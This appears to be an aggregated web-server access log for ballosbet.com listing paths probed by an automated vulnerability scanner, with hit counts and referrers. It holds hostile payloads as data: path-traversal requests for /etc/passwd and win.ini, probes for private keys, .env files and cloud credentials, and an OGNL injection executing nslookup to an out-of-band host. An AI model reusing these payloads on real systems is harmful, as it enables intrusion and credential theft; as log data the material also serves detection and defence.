+/language/lang 2 https://ballosbet.com/
+//../../../WEB-INF/web.xml 2 -
+/admin/pr_monitor/getting_index_data.php 2 -
+/public/plugins/camptocamp-prometheus-alertmanager-datasource/../../../../../conf/defaults.ini 1 -
+/public/plugins/digrich-bubblechart-panel/../../../../../conf/defaults.ini 1 -
+/jmx-console/ 14 -
+/Side.php 2 -
+/api/subscriber 2 -
+/flash/addcrypted2 2 -
+/api/system/sessions 2 https://ballosbet.com/
+/console/ 10 -
+/cgi-bin/supervisor/Factory.cgi 2 -
+/Visitor//%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fwindows%5Cwin.ini 1 -
+/public/plugins/yesoreyeram-boomtable-panel/../../../../../conf/defaults.ini 1 -
+/api/2.0/mlflow-artifacts/artifacts/32ry102jqAJYji6ZsvW2aOp63og 1 -
+/classes/Master.php 3 -
+/user/login/login 1 -
+/orders/3 3 -
+/%24%7B%40java.lang.Runtime%40getRuntime%28%29.exec%28%22nslookup%20d35u8vv3cnchvb4gjelgatetki4md311r.oast.me%22%29%7D/ 1 -
+/actuator/gateway/refresh 2 -
+//certificates/ballosbet.com.p12 1 -
+/classes/Login.php 4 -
+/app/login 2 -
+/public/plugins/opennms-helm-app/../../../../../conf/defaults.ini 1 -
+/public/plugins/grafadruid-druid-datasource/../../../../../conf/defaults.ini 1 -
+/tc.CBS.Appl/tcspseudo 2 -
+/supershell/login/auth 2 -
+/druid/indexer/v1/sampler 4 -
+/ajax/calendar.php 2 -
+/pages/templates2/viewpagetemplate.action 2 -
+/PhoneBackup/dlhdv8nE.php 1 -
+/cloudexp/application/configs/application.ini 1 -
+/lucee/admin/imgProcess.cfm 3 -
+/system/console 2 -
+/EVATQ.jsp 1 -
+/plus/weixin.php 2 -
+/component_server 8 -
+/phpMyAdmin/server_import.php 1 -
+/XMLCHART 3 -
+/view/systemConfig/management/nmc_sync.php 4 -
+/logos_clients/32rBXgFhXI46Ryw4jx7ddzZvjnC.php 2 -
+/login.htm 2 -
+/kylin/api/user/authentication 12 -
+/SDK/webLanguage 2 -
+/public/plugins/logs/../../../../../conf/defaults.ini 1 -
+/cgi-bin/network_config/nsg_masq.cgi 2 -
+/public/plugins/aws-datasource-provisioner-app/../../../../../conf/defaults.ini 1 -
+/cgi-bin/gateway/agentinfo 2 -
+/rest/wikis/xwiki/spaces/Sandbox/pages/WebHome/attachments 2 -
+/admin/auth/reset-password 2 -
+/public/plugins/linksmart-sensorthings-datasource/../../../../../conf/defaults.ini 1 -
+/wp-content/plugins/paid-memberships-pro/js/updates.js 1 -
+/j_spring_security_check 3 https://www.ballosbet.com/login
+/yHdoGmwRTR.txt 2 -
+/protocol.csp 2 https://www.ballosbet.com/network.html
+/node_modules/angular-base64-upload/demo/server.php 2 -
+//..0x5c..0x5c..0x5c..0x5c..0x5c..0x5c..0x5c..0x5cwindows/win.ini 1 -
+/modules/attributewizardpro/file_upload.php 2 -
+/%C0%AE%C0%AE/%C0%AE%C0%AE/%C0%AE%C0%AE/%C0%AE%C0%AE/%C0%AE%C0%AE/%C0%AE%C0%AE/%C0%AE%C0%AE/%C0%AE%C0%AE/windows/win.ini 1 -
+/.well-known/apple-app-site-association 2 -
+/carbon/admin/login_action.jsp 2 -
+/rpc.cgi 3 https://www.ballosbet.com/sysinfo.cgi
+/cgi-bin/popen.cgi 4 -
+/jeecg-boot/jmreport/qurestSql 2 -
+/weaver/com.weaver.formmodel.apps.ktree.servlet.KtreeUploadAction 1 -
+/ap_spec_rec/upload/ 2 -
+/id_ed25519 1 -
+/w_selfservice/oauthservlet/../../gz/LoadOtherTreeServlet 1 -
+/public/plugins/sentinelone-dataset-datasource/../../../../../conf/defaults.ini 1 -
+/dfsms/ 2 -
+/public/plugins/cloudwatch/../../../../../conf/defaults.ini 1 -
+/ReportServer/Pages/Folder.aspx 2 -
+//slr/application/configs/application.ini 1 -
+/public/plugins/innius-grpc-datasource/../../../../../conf/defaults.ini 1 -
+/public/plugins/monasca-datasource/../../../../../conf/defaults.ini 1 -
+/ssl/localhost.key 1 -
+/css/support_parent.css 2 -
+/public/plugins/bmchelix-ade-datasource/../../../../../conf/defaults.ini 1 -
+/api/v4/auth 2 -
+/admin.php 6 -
+/.well-known/webfinger 2 -
+/cmd,/simZysh/register_main/setCookie 1 -
+/public/plugins/tdengine-datasource/../../../../../conf/defaults.ini 1 -
+/~projects 2 -
+/__weave/file/tmp/weave/fs/../../../etc/passwd 1 -
+/ProcessPlus 2 -
+/php/ztp_gate.php/.js.map 1 -
+/pandora_console/index.php 3 -
+/public/plugins/grafana-guidedtour-panel/../../../../../conf/defaults.ini 1 -
+/api/group/list 2 -
+/public/plugins/marcusolsson-treemap-panel/../../../../../conf/defaults.ini 1 -
+/boaform/admin/formTracert 1 https://www.ballosbet.com//diag_ping_admin_en.asp
+/public/plugins/iosb-sensorthings-datasource/../../../../../conf/defaults.ini 1 -
+/file-manager/backend/permissions 1 -
+/convert 2 -
+/vcac/ 4 -
+/bic/ssoService/v1/applyCT 2 -
+/api/v2/cmdb/system/admin 2 -
+/public/plugins/devopsprodigy-kubegraf-app/../../../../../conf/defaults.ini 1 -
+//shop/application/configs/application.ini 1 -
+/public/plugins/svennergr-hackerone-datasource/../../../../../conf/defaults.ini 1 -
+/php/change_config.php 6 -
+/de2api/user/info 2 -
+/auth/requestreset 5 -
+/appGet.cgi 2 https://ballosbet.com/
+/public/plugins/lightstep-metrics-datasource/../../../../../conf/defaults.ini 1 -
+/cgi-bin/nightled.cgi 2 -
+/.well-known/openpgpkey/hu/ 2 -
+/wp-config.php_orig 1 -
+/spre/auth/login 2 -
+/auth/login 4 -
+//.env.dev 2 -
+/oauth/token 10 https://www.ballosbet.com/
+/public/plugins/graph/../../../../../conf/defaults.ini 1 -
+/shop/application/configs/application.ini 1 -
+/cgi-bin/libagent.cgi 1 -
+/v2/query 2 -
+/wp-content/plugins/gallery-plugin/upload/php.php 1 -
+/CertSrv/ 1 -
+/api/v1/license/keys-status/ 1 -
+/public/plugins/jdbranham-diagram-panel/../../../../../conf/defaults.ini 1 -
+/php/login.php 1 -
+/CDGServer3/NetSecConfigAjax 1 -
+/network_test.php 2 -
+/public/plugins/marcusolsson-calendar-panel/../../../../../conf/defaults.ini 1 -
+/ccmadmin/j_security_check 2 https://www.ballosbet.com//ccmadmin/showHome.do
+//site_cg/application/configs/application.ini 1 -
+/version 2 -
+/redfish/v1/SessionService/Sessions/ 2 -
+/public/plugins/jaeger/../../../../../conf/defaults.ini 1 -
+/index.min.js 5 -
+/ssl/ballosbet.com.pem 1 -
+/public/plugins/thiagoarrais-matomotracking-panel/../../../../../conf/defaults.ini 1 -
+/interface/main/main_screen.php 2 -
+/public/plugins/boazreicher-mosaicplot-panel/../../../../../conf/defaults.ini 1 -
+/actions/entree.php 2 -
+/api/auth:signIn 2 -
+/apriso/WebServices/FlexNetOperationsService.svc/Invoke 2 -
+/v1/app/writeFileSync 2 -
+/wp-json/click5_sitemap/API/update_html_option_AJAX 6 -
+/public/plugins/alexanderzobnin-zabbix-app/../../../../../conf/defaults.ini 1 -
+/proxy 2 -
+/FormLogin 2 -
+/jeecg-boot/jmreport/queryFieldBySql 2 -
+/api/webdav/chatgpt-next-web/backup.json 1 -
+/public/plugins/news/../../../../../conf/defaults.ini 1 -
+/wp-json/notificationx/v1/analytics 2 -
+/cas/js/lib/buttons/LwYmm.jsp 1 -
+/aim/equipmap/accept.jsp 1 -
+/api/v2/parameters/core/ 2 -
+/en/php/usb_sync.php 3 -
+/public/plugins/marcusolsson-hourly-heatmap-panel/../../../../../conf/defaults.ini 1 -
+/prweb/ 2 -
+//ssl/ballosbet.com_key.txt 1 -
+/adminer/adminer.php 2 -
+/auth/login/ 2 -
+/servlet/~baseapp/nc.message.bs.NCMessageServlet 2 -
+/scripts/setup.php 4 -
+/..%5C..%5C..%5C..%5C..%5C..%5Cetc/passwd 1 -
+/.env.live 3 -
+//../../WEB-INF/web.xml 2 -
+/swarm.cgi 2 -
+/manager/html 810 -
+/home/download 2 -
+/sysinit.shtml 2 -
+/include/file.php 2 -
+/v1/auth/users/login 2 -
+/public/plugins/anodot-panel/../../../../../conf/defaults.ini 1 -
+/rep/login 2 -
+/sign-in/ 2 -
+/.vscode/sftp.json 2 -
+/objects/buavk.txt 2 -
+/api/json 9 -
+/templates/default/html/windows/right.php 2 -
+/ssl.txt 1 -
+/user.php 4 554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:\"num\"
+/Uploads/32ry09TGIs7xkXfTyvCW5nEFkpg.php7 2 -
+/jeecg-boot/sys/dict/loadTreeData 4 -
+/registerUser.html 2 -
+/public/plugins/ayoungprogrammer-finance-datasource/../../../../../conf/defaults.ini 1 -
+/imc/flex/topobg/E9crKP3mMn.txt 1 -
+/cobbler_api 9 -
+/public/plugins/grafana-sentry-datasource/../../../../../conf/defaults.ini 1 -
+/api/v3/users 2 -
+/api/v1/database/6 10 -
+/fuel/login/ 4 https://www.ballosbet.com
+/webui/ 2 -
+/0/Authenticate 2 -
+/private.pem 1 -
+/public/plugins/fifemon-graphql-datasource/../../../../../conf/defaults.ini 1 -
+/.%5C%5C./.%5C%5C./.%5C%5C./.%5C%5C./.%5C%5C./.%5C%5C./windows/win.ini 1 -
+/sitecore_xaml.ashx/-/xaml/Sitecore.Xaml.Tutorials.Styles.Index 2 -
+/nacos/v1/auth/users 2 -
+/api/2.0/services/usermgmt/password/tvfrso 2 -
+//..%5c..%5c..%5c..%5c..%5c..%5c..%5cetc/passwd 1 -
+/en-US/account/login 4 -
+/WebInterface 2 -
+/_fragment 2 -
+//..%5cetc/passwd 1 -
+/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance 1 -
+/public/plugins/grafana-github-datasource/../../../../../conf/defaults.ini 1 -
+/graphql 4 -
+/actuator/gateway/routes/32ry04jhFXsQRtffwgnHcLBnQC0 2 -
+/hybridity/api/sessions 2 -
+/public/plugins/ccin2p3-riemann-datasource/../../../../../conf/defaults.ini 1 -
+/rpc.php 2 -
+/goform/setmac 2 https://www.ballosbet.com//index.htmlr
+/public/plugins/fzakaria-simple-annotations-datasource/../../../../../conf/defaults.ini 1 -
+/webtools/control/forgotPassword/././ProgramExport 7 -
+/wp-json/hc/v1/themehunk-import 2 -
+/cgi-bin/mainfunction.cgi/apmcfgupload 4 -
+/manage/webshell/u 8 -
+/public/plugins/blackmirror1-statusbygroup-panel/../../../../../conf/defaults.ini 1 -
+/cgi-bin/supportInstaller 2 -
+/jexinv4/jexinv4.jsp 1 -
+/content.php 2 -
+/hms/user-login.php 2 -
+/js/lkk_ch.js 3 -
+/public/plugins/natel-usgs-datasource/../../../../../conf/defaults.ini 1 -
+/php-info.php 2 -
+/public/plugins/bsull-materialize-datasource/../../../../../conf/defaults.ini 1 -
+/public/plugins/status-histor/../../../../../conf/defaults.ini 1 -
+/jexws/jexws.jsp 1 -
+/index.php/wp-json/wp/v2/sensei_email/ 2 -
+/app-ads.txt 3 -
+//static/..%5c..%5c..%5c..%5cetc/passwd 1 -
+/public/plugins/cloudflare-app/../../../../../conf/defaults.ini 1 -
+/32ry0JlpVG7b7owCCicVjBkgLlK.jsp 1 -
+/http/index.php 4 -
+//certs/ballosbet.com_private.key 1 -
+/public/plugins/aceiot-svg-panel/../../../../../conf/defaults.ini 1 -
+/menu.php 2 -
+/teamserver/j_security_check 2 -
+/nuclei.svg 102 -
+/users/user-dark-features 2 -
+/wp-json/sure-triggers/v1/automation/action 2 -
+/public/plugins/digiapulssi-breadcrumb-panel/../../../../../conf/defaults.ini 1 -
+/32rxzy2Chep2KZS1gKazwZxHAYU.jsp/ 1 -
+/modules/appagebuilder/config.xml 2 -
+/a/pl 1 -
+/wp-content/plugins/wpcargo/includes/barcode.php 2 -
+/.env.local 3 -
+/public/plugins/williamvenner-timepickerbuttons-panel/../../../../../conf/defaults.ini 1 -
+/modules/pscartabandonmentpro/upload.php 2 -
+/login.do 2 -
+/login.action 12 -
+/servlets/OmaDsServlet 2 -
+/RemoteApplicationMetadata.rem 2 -
+/ueditor/php/controller.php 1 -
+/live_check.shtml 2 -
+/Ndxe6s.txt 2 -
+/xmlpserver/services/XMLPService 2 -
+/modules/Rubrics/rubrics_visualise_saveAjax.php 2 -
+/servlet/~ic/bsh.servlet.BshServlet 6 -
+/json 14 -
+/public/plugins/grafana-oracle-datasource/../../../../../conf/defaults.ini 1 -
+/webtools/control/xmlrpc 3 -
+/service/0/test.oast.me 2 -
+/api/v1/login/oauth2/auth 2 -
+/cgi/get_param.cgi 2 -
+/web/rest/v1/login/sessions 14 -
+/spip.php 4 -
+/robots.txt 2 -
+/public/plugins/ae3e-plotly-panel/../../../../../conf/defaults.ini 1 -
+/webtools/control/main/ProgramExport 4 -
+/.well-known/openid-configuration 2 -
+/certs/ballosbet.com.pem 1 -
+/public/plugins/postgres/../../../../../conf/defaults.ini 1 -
+/public/plugins/percona-percona-app/../../../../../conf/defaults.ini 1 -
+/objects/BvgD.txt 2 -
+//Partners/application/configs/application.ini 1 -
+/public/plugins/yeya24-chaosmesh-datasource/../../../../../conf/defaults.ini 1 -
+/public/plugins/grafana-worldmap-panel/../../../../../conf/defaults.ini 1 -
+/queue/data 2 -
+/index.php/oqrs/request_form 2 -
+/NmAPI/RecurringReport 1 -
+/api.php 2 -
+/api/v1/database/4 10 -
+/.env.production.local 3 -
+//wp-config.txt 1 -
+/api/auth/login 9 -
+/cgi-bin/execute_cmd.cgi 2 -
+/pig/add-pig.php 2 -
+/phpmyadmin/server_import.php 1 -
+/_ignition/execute-solution 11 -
+//./../../../../../../../../../../windows/win.ini 1 -
+/getcfg.php 8 -
+//static/..%5cetc/passwd 1 -
+/_layouts/15/ToolPane.aspx/ 3 /_layouts/SignOut.aspx
+/ajax-api/2.0/mlflow/model-versions/create 9 -
+/workflow/jsp/logon.jsp 1 -
+/nagiosxi/login.php 12 -
+/32ry0jkzunXwfPKeDezVn0cbvWu.txt 2 https://ballosbet.com}}/advance/portfwd.html
+/invoker/EJBInvokerServlet/ 3 -
+/public/plugins/grafana-gitlab-datasource/../../../../../conf/defaults.ini 1 -
+/geoserver/wms 4 -
+/public/plugins/sbueringer-consul-datasource/../../../../../conf/defaults.ini 1 -
+/.env.prod.local 3 -
+/weaver/bsh.servlet.BshServlet 4 -
+/geoserver/wfs 4 -
+/backend/settings/oauth_adfs 2 -
+/api/remote 2 -
+/public/plugins/dalvany-image-panel/../../../../../conf/defaults.ini 1 -
+/developmentserver/metadatauploader 2 -
+/public/plugins/lework-lenav-panel/../../../../../conf/defaults.ini 1 -
+/webadmin/script 4 -
+/apisix/batch-requests 2 -
+/imc/primepush/../flex/topobg/E9crKP3mMn.txt 1 -
+//server_import.php 1 -
+/esp/cms_changeDeviceContext.esp 4 -
+/alerts/alertConfigField.php 1 -
+/jbpm-console/app/tasks.jsf 8 -
+/public/plugins/grafana-mongodb-datasource/../../../../../conf/defaults.ini 1 -
+/decisioncenter/j_security_check 2 -
+/wp-json/pie/v1/login 2 -
+/file/../../../../../../../../../../../../../../../../../../windows/win.ini 1 -
+/file-manager/backend/makefile 2 -
+/auto-login-admin.php 2 -
+/wls-wsat/RegistrationRequesterPortType 3 -
+/auth/createAdmin 2 https://www.ballosbet.com/app/
+/ballosbet.com.pem 1 -
+/forgot-password/ 2 -
+/rest/wikis/xwiki/pages 2 -
+/public/plugins/netsage-slopegraph-panel/../../../../../conf/defaults.ini 1 -
+/defaultroot/iWebOfficeSign/OfficeServer.jsp/../../public/iSignatureHTML.jsp/DocumentEdit.jsp 1 -
+/solr/gettingstarted_shard2_replica_n1/debug/dump 1 -
+/dologin.action 4 -
+/api/v1/repos/search 2 -
+/32ry06cQABHHuokkIFSh9x3mw8c.jsp/ 1 -
+/.env.stage 3 -
+//..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cetc/passwd 1 -
+/search 2 -
+/public/plugins/sni-thruk-datasource/../../../../../conf/defaults.ini 1 -
+/attachment/personal/_temp.php 2 -
+/zabbix.php 2 -
+/cgi-bin/sc_mgr.cgi 2 -
+/index.php 12 -
+/Login.aspx 2 -
+/v1/query 2 -
+/public/plugins/grafana-wavefront-datasource/../../../../../conf/defaults.ini 1 -
+/public/plugins/humio-datasource/../../../../../conf/defaults.ini 1 -
+//pma/server_import.php 1 -
+/public/plugins/ovh-warp10-datasource/../../../../../conf/defaults.ini 1 -
+//..%5c..%5c..%5c..%5c..%5cetc/passwd 1 -
+/setup.cgi 2 -
+/cgi-bin/Save.cgi 2 -
+/general/weibo/javascript/LazyUploadify/uploadify.php 2 -
+/pREVOo2w.jsp 1 -
+/dview8/api/usersByLevel 2 -
+/management 2 -
+/public/plugins/grafana-athena-datasource/../../../../../conf/defaults.ini 1 -
+/public/plugins/grafana-saphana-datasource/../../../../../conf/defaults.ini 1 -
+/config.php.new 1 -
+/exciter.php 2 -
+/mac/gateway.php 2 -
+//static/..%5c..%5c..%5c..%5c..%5cetc/passwd 1 -
+/public/plugins/redis-datasource/../../../../../conf/defaults.ini 1 -
+/__ 4 -
+/Reports/Pages/Folder.aspx 2 -
+/..%5C..%5C..%5C..%5C..%5Cetc/passwd 1 -
+/api/proxy/tcp 2 -
+//static/..%5c..%5c..%5c..%5c..%5c..%5c..%5cetc/passwd 1 -
+/cgi-bin/account_mgr.cgi 8 -
+/hue/accounts/login 2 -
+/ajaxPages/writeBrowseFilePathAjax.php 2 -
+/public/plugins/macropower-analytics-panel/../../../../../conf/defaults.ini 1 -
+/jbossass/jbossass.jsp 1 -
+/login.html 4 -
+/static/..%5C..%5Cetc/passwd 1 -
+/carbon/generic/save_artifact_ajaxprocessor.jsp 2 -
+/restrito/login/sub/ 2 -
+/api/v1/users 2 -
+/modules/blocktestimonial/addtestimonial.php 1 -
+/install/update.html 2 -
+/WSVulnerabilityCore/VulCore.asmx 6 -
+/application.ini 1 -
+/32ry06OPckx4YWOo6ypAG8dooh2.txt 2 -
+/geoserver/ 2 -
+/commandcenter/deployWebpackage.do 2 -
+/Uploads/32rBXaNXqPUrSgpkhcVtgol56zm.php7 2 -
+//../WEB-INF/web.xml 2 -
+/data/sys-common/treexml.tmpl 2 -
+/id_rsa_3072 1 -
+//CertSrv/ 1 -
+/public/plugins/marcusolsson-hexmap-panel/../../../../../conf/defaults.ini 1 -
+/npm-pwg/.. 4 -
+/public/plugins/gowee-traceroutemap-panel/../../../../../conf/defaults.ini 1 -
+/api/v1/database/10 10 -
+/upload/userfiles/image/32ry0roVebsXk6WuaUToVGRxpVN.png 1 -
+/3/ParseSetup 2 -
+/cpanel.php 2 -
+//static/..%5c..%5cetc/passwd 1 -
+/public/plugins/savantly-heatmap-panel/../../../../../conf/defaults.ini 1 -
+/public/plugins/esnet-chord-panel/../../../../../conf/defaults.ini 1 -
+/.well-known/oauth-authorization-server 2 -
+/pages/createpage.action 2 -
+/wfs 4 -
+/public/plugins/pgollangi-firestore-datasource/../../../../../conf/defaults.ini 1 -
+/api/runscript 2 -
+/api/gen/clients/csharp 2 -
+/public/plugins/pue-solr-datasource/../../../../../conf/defaults.ini 1 -
+/inlong/manager/api/anno/login 2 -
+/rest/ofs/deleteUserRequestInfoByXml 1 -
+//admin/pma/server_import.php 1 -
+/public/plugins/stackdriver/../../../../../conf/defaults.ini 1 -
+/ws_utc/resources/setting/keystore 2 -
+/webtools/control/SOAPService 5 -
+/public/plugins/marcuscalidus-svg-panel/../../../../../conf/defaults.ini 1 -
+/cgi-bin/dispatcher.cgi 3 -
+/_images/EM3RVA 2 -
+/plugin/add 1 -
+/ajax/openvpn/del_ovpncfg.php 1 -
+/STATE_ID/123/agentLogUploader 2 -
+/seeyon/main.do 4 -
+/api/jmeter/download/files 2 -
+/.env.dev.local 3 -
+/setup/setupadministrator-start.action 8 https://www.ballosbet.com/setup/setupadministrator-start.action
+/admin/ 2 -
+/control/login 2 -
+//.env_1 3 -
+/public/plugins/blackmirror1-singlestat-math-panel/../../../../../conf/defaults.ini 1 -
+/home/ballosbetWORDPRESS.txt 1 -
+/welcome 2 -
+/server-info.action 4 https://www.ballosbet.com/server-info.action
+/ssl/ballosbet.com_key.txt 1 -
+/actuator/env 2 -
+/public/plugins/itrs-obcerv-datasource/../../../../../conf/defaults.ini 1 -
+/goform/formWsc 2 -
+/tplus/ajaxpro/RecoverPassword,App_Web_recoverpassword.aspx.cdcab7d2.ashx 4 -
+/cslu/v1/var/logs/customer-cslu-lib-log.log 1 -
+/public/plugins/isaozler-shiftselector-panel/../../../../../conf/defaults.ini 1 -
+/api/snapshots 2 -
+/sslvpn/sslvpn_client.php 2 -
+/user.action 4 -
+/parse 6 -
+/smartbi/vision/RMIServlet 4 -
+/jeecg-boot/drag/onlDragDatasetHead/getTotalData 2 -
+/com.example.TestService 2 -
+/ipjl0glbois.php 2 -
+/Users/authenticatebyname 21 -
+/public/plugins/singlestat/../../../../../conf/defaults.ini 1 -
+//application.ini 1 -
+/appInfo/assert 2 -
+//./../../../../../../../../../../etc/passwd 1 -
+/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/windows/win.ini 1 -
+/wp-content/plugins/showbizpro/temp/update_extract/eqB1B.php 2 -
+/ajax/api/content_infraction/getIndexableContent 2 -
+/Startup/Register 2 -
+//.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/windows/win.ini 1 -
+/v3/settings/first-login 2 -
+/cog/info 2 -
+/wp-json/wp/v2/add-listing 2 -
+/api/v1/validate/code 2 -
+/seeyon/management/index.jsp 2 -
+/cgi-bin/78b0L7.txt 2 -
+/DownLoadCourseware 1 -
+/hac/j_spring_security_check 1 https://ballosbet.com/login
+//crl/ 1 -
+//moto/application/configs/application.ini 1 -
+/mesh/servlet/mesh.webadmin.MESHAdminServlet 2 -
+/32ry0PpX0pQMrcjiqLD25T8a8JK.json 2 -
+/authenticationendpoint/32ry0lgnqqjv2qv60ebpljmjxga.jsp 1 -
+/admin/File/DownloadFile 2 -
+/public/plugins/zestairlove-compacthostmap-panel/../../../../../conf/defaults.ini 1 -
+//.env.example 3 -
+/api/v1/snapshots 2 -
+/id_rsa_4096 1 -
+/testing-put.txt 4 -
+/slr/application/configs/application.ini 1 -
+/ibmmq/console/j_security_check 5 https://www.ballosbet.com/ibmmq/console/login.html
+/mdm/checkin 4 -
+/api/jobs/Job_6BJXIj/logs 2 -
+/auto-login.php 2 -
+/struts2-rest-showcase/orders/3 3 -
+/public/plugins/pr0ps-trackmap-panel/../../../../../conf/defaults.ini 1 -
+/wp-autologin.php 2 -
+/javax.faces.resource/dynamiccontent.properties.xhtml 3 -
+/session_login.cgi 6 https://www.ballosbet.com
+/public/plugins/grafana-opensearch-datasource/../../../../../conf/defaults.ini 1 -
+/api/v1/cav/admin/options 1 -
+/public/plugins/ventura-psychrometric-panel/../../../../../conf/defaults.ini 1 -
+//../../../../../../../../../windows/win.ini 1 -
+//.ssh/id_rsa_2048 1 -
+/camunda/app/welcome/default/ 2 -
+/api/v1/users/signup 1 -
+/guestLogin.html 2 -
+//ssl_key.txt 1 -
+/wp-content/plugins/cz-loan-management/README.txt 2 -
+/.env.save 2 -
+/public/plugins/nagasudhirpulla-api-datasource/../../../../../conf/defaults.ini 1 -
+/ubus/ 2 -
+/partymgr/control/getJSONuiLabel 4 -
+/web/google_analytics.php 3 -
+/cgi-bin/system_log.cgi 2 -
+/lshw 2 -
+/UploadService/Page/ 2 -
+/public/plugins/orchestracities-iconstat-panel/../../../../../conf/defaults.ini 1 -
+/.env.www 2 -
+//seminovos/application/configs/application.ini 1 -
+/public/plugins/esnet-matrix-panel/../../../../../conf/defaults.ini 1 -
+//ssl/localhost.key 1 -
+//private.pem 1 -
+/.env.ballosbet 2 -
+/orion/login 2 https://www.ballosbet.com/orion/login
+/public/plugins/michaeldmoore-annunciator-panel/../../../../../conf/defaults.ini 1 -
+/public/plugins/grafana-singlestat-panel/../../../../../conf/defaults.ini 1 -
+/tplus/ajaxpro/Ufida.T.SM.Login.UIP.LoginManager,Ufida.T.SM.Login.UIP.ashx 1 -
+/cms/application/configs/application.ini 1 -
+/wp-amin 4 -
+/users 2 -
+/public/plugins/marcusolsson-ynab-datasource/../../../../../conf/defaults.ini 1 -
+/%23 5 -
+//host.key 1 -
+/jtcgi/soap_cgi.pyc 2 -
+/bonita/loginservice 3 -
+/analytics/telemetry/ph/api/hyper/send 2 -
+/iOffice/prg/set/wss/udfmr.asmx 2 -
+/public/plugins/anodot-datasource/../../../../../conf/defaults.ini 1 -
+/public/plugins/digiapulssi-organisations-panel/../../../../../conf/defaults.ini 1 -
+/realms/master/protocol/openid-connect/auth 2 -
+/cache/index.tpl.php 2 -
+/api/ 1 -
+/casa/nodes/thumbprints 2 -
+//jwt/private.pem 1 -
+/32ry0YO1Zo2lolvpfL2V8Pr3hcL 2 -
+/type.php 4 -
+/pentaho/j_spring_security_check 2 -
+//..///////..////..//////windows/win.ini 1 -
+/actuator/heapdump 2 -
+/public/plugins/grafana-mock-datasource/../../../../../conf/defaults.ini 1 -
+/www.key 1 -
+/evo-apigw/admin/API/Developer/GetClassValue.jsp 2 -
+/nacos/v1/auth/users/login 2 -
+/public/plugins/sebastiangunreben-cdf-panel/../../../../../conf/defaults.ini 1 -
+/api/sessions 3 -
+/global-protect/portal/images/32ry09Ruqurb0eFv1SAhROY16QH.txt 4 -
+/service/extension/backup/mboximport 3 -
+/app/rest/users/id:1/tokens/RPC2 2 -
+/checkValid 4 -
+/v1/agent/check/deregister/32ry0kritgW49agWKFF5FVQKSSQ 1 -
+/Citrix/XenApp/auth/login.aspx 2 https://ballosbet.com/Citrix/XenApp/auth/login.aspx
+/wp-json/metform/v1/forms/templates/0 2 -
+/ebook/bookPerPub.php 2 -
+/php/movefile.php 2 -
+/lucee/32ry0mDVNzu0HdJoyQhCIJXJGb8.cfm 1 -
+/alerts/alertLightbox.php 2 -
+/reviewInput.php 2 -
+/user/login 6 -
+/wp-config.inc 1 -
+/api/v2/templates/ 1 -
+//certs/ballosbet.com.pem 1 -
+/public/plugins/grafana-oncall-app/../../../../../conf/defaults.ini 1 -
+/wiki/pages/createpage-entervariables.action 3 -
+/common/config.php.new 1 -
+/EemAdminService/EemAdmin 2 -
+/login/index.php 6 https://www.ballosbet.com/login/
+/debug/pyspidervulntest/run 2 -
+///system///console///bundles 1 -
+/webapi/auth 3 -
+/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../windows/win.ini 1 -
+/32ry08P44yxwATOm1WFjsyn4NKd.php 2 -
+/page/exportImport/fileTransfer/32ry0VX0ZtnB1961NbKyJEpMigy.jsp 1 -
+/info.php 2 -
+/lib/crud/userprocess.php 7 -
+/ocpu/library/base/R/do.call/json 2 -
+/jc6/servlet/clobfield 2 -
+/%C0%AE%C0%AE/%C0%AE%C0%AE/%C0%AE%C0%AE/windows/win.ini 1 -
+/%C0%AE%C0%AE/%C0%AE%C0%AE/%C0%AE%C0%AE/%C0%AE%C0%AE/%C0%AE%C0%AE/%C0%AE%C0%AE/%C0%AE%C0%AE/%C0%AE%C0%AE/etc/passwd 1 -
+/photo/p/api/album.php 4 -
+/seminovos/application/configs/application.ini 1 -
+/fetch_products.php 2 -
+/client/api/ 1 -
+/goform/set_hidessid_cfg 2 {[RootURL]}/admin/more.html
+/public/plugins/spotify-heroic-datasource/../../../../../conf/defaults.ini 1 -
+/api/v1/auth/tokens/ 2 -
+/xxl-job-admin/login 2 -
+/geoserver/web/ 2 -
+/confluence/pages/createpage-entervariables.action 4 -
+//home/ballosbet-WORDPRESS.txt 1 -
+/wp-content/plugins/woc-order-alert/assets/admin/js/scripts.js 1 -
+/dav/server.php/files/personal/../..//..//../data/settings/settings.xml 1 -
+//wp-config.inc 1 -
+/goform/login 2 -
+/boafrm/formSysCmd 2 -
+/icons/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/etc/passwd 1 -
+/public/template.cgi 2 -
+/API/regionsDiscovery.php 2 -
+/CMSPages/Staging/SyncServer.asmx/ProcessSynchronizationTaskData 2 -
+/api/v1/apikey 2 https://ballosbet.com/document-stores
+/32ry0I3MiDPuZ0idQ3S9fFYZvGO.php 2 -
+/deserialize 6 -
+/21408623/cgi-bin/tsaws.cgi 2 -
+/id_rsa_2048 1 -
+/public/plugins/netsage-sankey-panel/../../../../../conf/defaults.ini 1 -
+/controller/ping.php 1 https://www.ballosbet.com/controller/ping.php
+/public/plugins/pyroscope-panel/../../../../../conf/defaults.ini 1 -
+/pma/server_import.php 1 -
+/api/v1/users/login 1 -
+/cgi-bin/logo_extra_upload.cgi 2 -
+/public/plugins/volkovlabs-echarts-panel/../../../../../conf/defaults.ini 1 -
+/PhoneBackup/FMEKUTc9.php 3 -
+/welcome.action 4 https://www.ballosbet.com/welcome.action
+/public/plugins/volkovlabs-rss-datasource/../../../../../conf/defaults.ini 1 -
+//%c0%ae/%c0%ae/WEB-INF/web.xml 1 -
+/cgi/login.cgi 3 -
+/configWizard/keyUpload.jsp 2 -
+/../../../../../../../../../../etc/passwd 1 -
+/public/plugins/pluginlist/../../../../../conf/defaults.ini 1 -
+/misc.php 2 -
+/public/plugins/stagemonitor-elasticsearch-app/../../../../../conf/defaults.ini 1 -
+/api/data 2 -
+/NmConsole/WugSystemAppSettings/JMXSecurity 2 -
+/_users/org.couchdb.user:poc 3 -
+/inc/jquery/uploadify/uploadify.php 2 -
+/dashboardUser 2 -
+/admin/pma/server_import.php 1 -
+/fpc/login/ 2 https://ballosbet.com/fpc/app/login
